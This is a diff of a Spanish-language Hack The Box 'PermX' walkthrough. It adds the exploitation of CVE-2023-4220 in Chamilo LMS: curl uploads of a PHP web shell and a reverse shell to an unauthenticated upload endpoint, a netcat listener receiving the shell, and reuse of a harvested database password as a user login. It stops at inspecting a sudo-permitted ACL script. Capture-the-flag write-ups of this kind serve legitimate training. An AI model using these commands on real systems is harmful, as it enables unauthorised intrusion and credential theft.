@@ -7,14 +7,14 @@
 
 
 ```bash
-nmap -sS -p- -Pn -n --min-rate 5000 -vvv -oN iniScanPermx.txt 10.129.59.54
+nmap -sS -p- -Pn -n --min-rate 5000 -vvv -oN iniScanPermx.txt 10.129.61.184
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 63
 80/tcp open  http    syn-ack ttl 63
 ```
 
 ```bash
-nmap -sCV -p22,80 -Pn -n -vvv -oN verScanPermx.txt 10.129.59.54
+nmap -sCV -p22,80 -Pn -n -vvv -oN verScanPermx.txt 10.129.61.184
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -34,7 +34,7 @@ Añadimos permx.htb en /etc/hosts
 
 ```bash
 whatweb permx.htb
-http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.59.54], JQuery[3.4.1], Script, Title[eLEARNING]
+http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.61.184], JQuery[3.4.1], Script, Title[eLEARNING]
 ```
 
 http://permx.htb/
@@ -130,7 +130,7 @@ Añadimos www.permx.htb y lms.permx.htb a /etc/hosts
 ```bash
 whatweb http://lms.permx.htb/
 
-http://lms.permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.129.59.54], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
+http://lms.permx.htb/ [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.129.61.184], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
 ```
 
 http://lms.permx.htb/
@@ -224,8 +224,130 @@ http://lms.permx.htb//README.md
 <SNIP>
 ```
 
-https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-4220
 
-https://github.com/oxapavan/CVE-2023-4220-HTB-PermX
-https://github.com/oxapavan/CVE-2023-4220-HTB-PermX/blob/main/script.sh
+### CVE-2023-4220
 
+https://nvd.nist.gov/vuln/detail/CVE-2023-4220
+https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-4220
+### CVE-2023-4220
+
+Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS \<= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell.
+
+https://starlabs.sg/advisories/23/23-4220/
+
+
+##### CVE-2023-3368
+Interesante necesario para ejecutar el cve anterior, aunque no necesario para esta maquina
+https://nvd.nist.gov/vuln/detail/CVE-2023-3368
+https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-3368
+https://starlabs.sg/advisories/23/23-3368/
+
+
+
+```bash
+┌──(fmol㉿kali)-[~/htb/permx/exploit]
+└─$ echo '<?php system("id"); ?>' > rce.php
+
+┌──(fmol㉿kali)-[~/htb/permx/exploit]
+└─$ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'The file has successfully been uploaded.
+┌──(fmol㉿kali)-[~/htb/permx/exploit]
+└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
+
+```bash
+┌──(fmol㉿kali)-[~/htb/permx/exploit]
+└─$ curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+The file has successfully been uploaded.
+┌──(fmol㉿kali)-[~/htb/permx/exploit]
+└─$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'
+
+
+
+```
+
+
+
+
+```bash
+──(fmol㉿kali)-[~]
+└─$ sudo nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.218] from (UNKNOWN) [10.129.61.184] 35996
+Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 21:37:13 up 17 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+
+
+
+```
+
+![](img/Pasted%20image%2020260129223805.png)
+
+
+/var/www/chamilo/app/config/configuration.php
+
+```
+// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;
+```
+
+/etc/passwd
+
+Existe un usuario llamado mtz (uid1000), es un usuario valido en el sistema con la contraseña de la base de datos.
+
+`mtz : 03F6lY3uXAP2bkW8`
+
+
+
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
+
+```bash
+mtz@permx:~$ ls -lha /opt/acl.sh
+-rwxr-xr-x 1 root root 419 Jun  5  2024 /opt/acl.sh
+mtz@permx:~$ cat /opt/acl.sh
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+```
